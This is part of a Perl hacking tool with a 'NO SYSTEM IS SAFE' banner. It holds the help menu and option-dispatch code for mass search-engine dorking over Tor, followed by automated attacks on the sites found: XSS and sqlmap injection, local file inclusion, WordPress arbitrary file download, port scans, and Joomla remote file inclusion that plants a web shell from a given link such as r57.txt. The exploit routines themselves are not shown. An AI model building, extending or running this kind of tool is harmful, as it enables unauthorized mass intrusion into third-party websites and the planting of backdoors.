     [+]======================    DISCLAIMER !!!  ======================[+]
     [+]  We will not be responsible or liable, directly or indirectly  [+]
     [+]  in any way for any loss or damage of any kind incurred as     [+]
     [+]                  a result of use of our material !!            [+]
     [+]================================================================[+]
     [+]                      NO SYSTEM IS SAFE !!!                     [+]
     [+]       If you like my tool you must know that i never           [+]
     [+]                      studied scripting!                        [+]
     [+]                NO Monopoly for the Knowledge!                  [+]
     [+]================================================================[+]
    \n";
  print color 'magenta', RESET;
}
###################################################################		
###################################################################		
###################################################################		
sub help {
  print color 'bold';
  print "[ ]............................................................................ \n\n";
  print color 'bold yellow';
  print "[..] HELP:: \n";
  print color RESET;
  print "   --proxy       | tor proxy [DEFAULT:socks://localhost:9050] Change if needed!\n";
  print "   -dork         | dork to search [Ex: house,cars,hotel] \n";
  print "   --level       | Scan level (+- Number of page results to scan) \n";
  print "   -t            | target \n";
  print "   --sqlmap      | sqlmaping xss results \n";
  print "   --xss         | xss scan \n";
  print "   --lfi         | local file inclusion \n";
  print "   --joomrfi     | get joomla sites with rfi in the server \n";
  print "   --shell       | shell link [Ex: http://www.site.com/shell.txt] \n";
  print "   --wpadf       | get wordpress sites with arbitery file download in the server\n";
  print "   --admin       | get site admin page \n";
  print "   --shost       | get site subdomains \n";
  print "   --ports       | scan server ports \n";
  print "   --start       | start scan port \n";
  print "   --end         | end scan port \n";
  print "   --all         | complete mode \n";
  print "   --basic       | basic mode \n";
  print "   --select      | Select mode you can set rang of ports \n";
  print "   --sites       | sites in the server \n";
  print "   --wp          | wordpress sites in the server\n";
  print "   --joom        | joomla sites in the server\n";
  print "   --upload      | get sites with upload files in the server  \n";
  print "   --zip         | get sites with zip files in the server \n";
  print "   --md5         | convert to md5 \n";
  print "   --encode64    | encode base64 string \n";
  print "   --decode64    | decode base64 string \n";
  print "   --TARGET      | Domain name [Ex: site.com] \n";
  print "   --FULL_TARGET | Full url [Ex: site.com/index.php?id=5] \n";
  print "   --valid       | text for validate results \n";
  print "   --exp         | exploit\n";
  print "   --command     | Extern Command to execute\n";
  print "   --isup        | check http status 200. \n";
  print "   --httpd       | print site httpd version \n";
  print "   --update      | check tool version \n";
  print "   --replace     | string to replace \n";
  print "   --with        | string to replace with \n";
  print "   --ip          | Add get ip to scan \n";
  print "   --server      | Add get server software to scan \n";
  print "   --save        | File to save scan results [by defaut the tool create one if not set!] \n\n";
  
  print color 'bold yellow';
  print "[..] EXAMPLES: \n\n";
  print color RESET;
  print color 'bold';
  print "  Tor: ";
  print color RESET;
  print "--proxy \n\n";
  print color 'bold';
  print "  Search engine: \n";
  print color RESET;
  print "    Search: --dork <dork> --level <level> \n";
  print "    Search + get ip: --dork <dork> --level <level> --ip\n";
  print "    Search + get ip + server: --dork <dork> --level <level> --ip --server\n";
  print "    Search with many dorks: --dork <dork1,dork2,dork3> --level <level> \n";
  print "    Search + get ip+server: --dork <dorks.txt> --level <level> \n";
  print "    Search + set save file: --dork <dorks.txt> --level <level> --save myfile.txt\n";
  print "    Search + Replace + Exploit: --dork <dorks.txt> --level <level> --replace <string> --with <string> --valid <string>\n\n";
  
  print color 'bold';
  print "  Subscan from Serach Engine: \n";
  print color RESET;
  print "    Search + Exploitation: --dork <dork> --level <10> --xss/--lfi/--wp ... \n";
  print "    Search + Server Exploitation: -t <ip> --level <10> --xss/--lfi/--wp ... \n";
  print "    Search + Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> --xss/--lfi/--wp ... \n\n";
  
  print color 'bold';
  print "  Validation: \n";
  print color RESET;
  print "    Search + Exploit + Validation: --dork <dork> --level <10> --exp --isup/--valid <string>\n";
  print "    Search + Server Exploit + Validation: -t <ip> --level <10> --exp --isup/--valid <string>\n";
  print "    Search + Replace + Exploit: --dork <dork> --level <10> --replace <string> --with <string> --isup/--valid <string>\n\n";
  print color 'bold';
  print "  Use List / Target: \n";
  print color RESET;
  print "    -t <target/targets.txt> --exp --isup/--valid <string>\n";
  print "    -t <target/targets.txt> --xss/--lfi .. \n\n";
  print color 'bold';
  print "  Server: \n";
  print color RESET;
  print "    Get Server sites: -t <ip> --level <value> --sites\n";
  print "    Get Server wordpress sites: -t <ip> --level <value> --wp \n";
  print "    Get Server joomla sites: -t <ip> --level <value> --joom \n";
  print "    Get Server upload sites: -t <ip> --level <value> --upload \n";
  print "    Get Server zip sites files: -t <ip> --level <value> --zip \n";
  print "    WP Arbitry File Download: -t <ip> --level <value> --wpadf \n";
  print "    Joomla RFI: -t <ip> --level <1> --joomfri --shell <shell link>\n";
  print "    Scan basic tcp (quick): -t <ip> --ports --basic tcp\n";
  print "    Scan basic udp basic (quick): -t <ip> --ports --basic udp\n";
  print "    Scan basic udp+tcp: -t <ip> --ports --basic udp+tcp\n";
  print "    Scan complete tcp: -t <ip> --ports --all tcp\n";
  print "    Scan complete udp: -t <ip> --ports --all udp\n";
  print "    Scan complete udp+tcp: -t <ip> --ports --all udp+tcp\n";
  print "    Scan rang tcp: -t <ip> --ports --select  tcp --start <value> --end <value>\n";
  print "    Scan rang udp: -t <ip> --ports --select  udp--start <value> --end <value>\n";
  print "    Scan rang udp + tcp: -t <ip> --ports --select  udp+tcp --start <value> --end <value>\n\n";
  print color 'bold';
  print "  Encode / Decode: \n";
  print color RESET;
  print "    Generate MD5: --md5 <string> \n";
  print "    Encode base64: --encode64 <string>  \n";
  print "    Decode base64: --decode64 <string> \n\n";
  
  print color 'bold';
  print "  External Command: \n";
  print color RESET;
  print "   --dork <dork/dorks.txt> --level <level> --command \"curl -v --TARGET\" \n";
  print "   --dork <dork/dorks.txt> --level <level> --command \"curl -v --FULL_TARGET\" \n";
  print "   -t <target/targets.txt> --level <level> --command \"curl -v --TARGET\" \n";
  print "   -t <target/targets.txt> --command \"curl -v --FULL_TARGET\" \n";
}

##############################################################
##############################################################
if (defined $Target) {
  if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $sqlmaptor) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $mhttpd) && (!defined $replace) && (!defined $with) && (!defined $mip) && (!defined $mserver) && (!defined $msites)) {
  advise();
  }
} 

if ((defined $dork) || (defined $Target)) {
  if (defined $mjoomrfi) {
	if (!defined $shell) {
      print "[ ] ----------------------------------------------------------------------- [ ]\n";
      print color 'yellow';
      print "[!] You have to set shell link! [Ex: http://www.site.co.uk/r57.txt]\n";
      print color 'RESET';
	  exit();
    }
  }
  if (((defined $replace) && (!defined $with)) || ((!defined $replace) && (defined $with))){
    print "[ ] ----------------------------------------------------------------------- [ ]\n";
    print color 'yellow';
    print "[!] Invalid option! [Ex: --replace <value> --with <value>]\n";
    print color 'RESET';
	exit();
  }
  if (defined $exploit) {
    if ((defined $mlfi) || (defined $mjoomrfi) || (defined $mwpadf) || (defined $madmin) || (defined $msubdomain) || (defined $mwpsites) || (defined $mjoomsites) || (defined $mupload) || (defined $mzip) || (defined $mhttpd) || (defined $msites)) {
      print "[ ] ----------------------------------------------------------------------- [ ]\n";
      print color 'yellow';
      print "[!] Invalid option! Are you crazy! No need of exploit use here!\n";
      print color 'RESET';
	  exit();
    }
  }
}

if (defined $mlevel) {
  if ((defined $dork) || (defined $Target)){
    if ((defined $Target) && ((defined $mxss) || (defined $exploit) || (defined $mports) || (defined $mlfi) || (defined $sqlmap) || (defined $mjoomrfi) || (defined $mwpadf)) ) {
      print "[ ] ----------------------------------------------------------------------- [ ]\n";
      print color 'yellow';
      print "[!] Are you crazy? you cannot do that with server ip!\n"; advise();
      print color 'RESET';
	  exit();
    }
    if (defined $Target) {
      if ((!defined $msites) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mhttpd) && (!defined $madmin)) {
	    advise();
      }  
    }
    if ((!defined $mxss) && (!defined $exploit) && (!defined $mlfi) && (!defined $command) && (!defined $misup) && (!defined $validation_text) && (!defined $sqlmap) && (!defined $sqlmaptor) && (!defined $madmin) && (!defined $msubdomain) && (!defined $mjoomrfi) && (!defined $mwpadf) && (!defined $mports) && (!defined $mwpsites) && (!defined $mjoomsites) && (!defined $mupload) && (!defined $mzip) && (!defined $mhttpd)) {
      submsearch();
      exit();
    }else{
      submsearch();
	  if (defined $dork) {
        if (defined $mxss) {
          if (defined $sqlmap) {
	        mxss(); sqlmap(); exit();
          }else{
            mxss(); exit();
	      }
        }elsif (defined $mlfi) { mlfi(); exit();
        }elsif (defined $mjoomrfi) { mjoomrfi(); exit();
        }elsif (defined $mwpadf) { mwpadf(); exit();
        }elsif (defined $madmin) { madmin(); exit();
        }elsif (defined $msubdomain) { msubdomain(); exit();
        }elsif (defined $mwpsites) { mwpsites(); exit();
        }elsif (defined $mjoomsites) { mjoomsites(); exit();
        }elsif (defined $mupload) { muploadsites(); exit();
        }elsif (defined $mzip) { mzipsites(); exit();}
	    if (defined $mhttpd) { mhttpd(); exit();}
	    if (defined $misup) { misup();exit();}
	    if (defined $validation_text) {mvalidation(); exit();}
	    if (defined $command) { mcommand(); exit();}
	  }elsif (defined $Target) {
        if (defined $madmin) { madmin(); exit();
        }elsif (defined $msubdomain) { msubdomain(); exit();
        }elsif (defined $mwpsites) { mwpsites(); exit();
        }elsif (defined $mjoomsites) { mjoomsites(); exit();
        }elsif (defined $mupload) { muploadsites(); exit();
        }elsif (defined $mzip) { mzipsites(); exit();}
	    if (defined $mhttpd) { mhttpd(); exit();}
	    if (defined $misup) { misup();exit();}
	    if (defined $validation_text) {mvalidation(); exit();}
        if (defined $command) { mcommand(); exit();}
	  }
    }
  }
}else{
  if (defined $Target) {
    if (defined $mxss) {
      if (defined $sqlmap) {
	    mxss(); sqlmap(); exit();
      }else{
        mxss(); exit();
	  }
    }elsif (defined $mlfi) { mlfi(); exit();
    }elsif (defined $mjoomrfi) { mjoomrfi(); exit();
    }elsif (defined $mwpadf) { mwpadf(); exit();
    }elsif (defined $madmin) { madmin(); exit();
    }elsif (defined $msubdomain) { msubdomain(); exit();
    }elsif (defined $mwpsites) { mwpsites(); exit();
    }elsif (defined $mjoomsites) { mjoomsites(); exit();
    }elsif (defined $mupload) { muploadsites(); exit();
    }elsif (defined $mzip) { mzipsites(); exit();}
    if (defined $mhttpd) { mhttpd(); exit();}
    if (defined $misup) {misup(); exit();}
    if (defined $validation_text) { mvalidation(); exit();}
    if (defined $command) {mcommand(); exit();}
	if (defined $mports) { 
      if (defined $mbasic) {
        if ($mbasic eq "tcp") { basic('tcp'); exit(); }
        if ($mbasic eq "udp") { basic('udp'); exit(); }
        if (($mbasic eq "udp+tcp") || ($mbasic eq "tcp+udp")) { basic2(); exit(); }
	  }
      if (defined $mall) {
        if ($mall eq "tcp") { complete('tcp'); exit(); }
        if ($mall eq "udp") { complete('udp'); exit(); }
        if (($mall eq "udp+tcp") || ($mall eq "tcp+udp")) { complete2(); exit(); }
	  }
      if (defined $muser) {
	    if ((!defined $mstart) && (!defined $mend)) {
          print color 'yellow';
          print "[!] Set a port range! [Ex: --start 21 --end 81]\n";
          print color 'RESET';
	      exit();
	    }else{
          if ($muser eq "tcp") { user('tcp'); exit(); }
          if ($muser eq "udp") { user('udp'); exit(); }
          if (($muser eq "udp+tcp") || ($muser eq "tcp+udp")) { user2(); exit(); }
		}
	  }
	}  
  }
}
#########################################################################
if ((defined $mmd5) || (defined $mdecode64) || (defined $mencode64)) {
  use Digest::MD5;
  use MIME::Base64;
  if (defined $mmd5) { mmd5();exit();
  }elsif (defined $mencode64) { mencode64();exit();
  }elsif (defined $mdecode64) { mdecode64();exit();}
}
#########################################################################
#########################################################################
if (defined $mabout) { mabout(); exit();}
if (defined $help) { help(); exit();}

#########################################################################
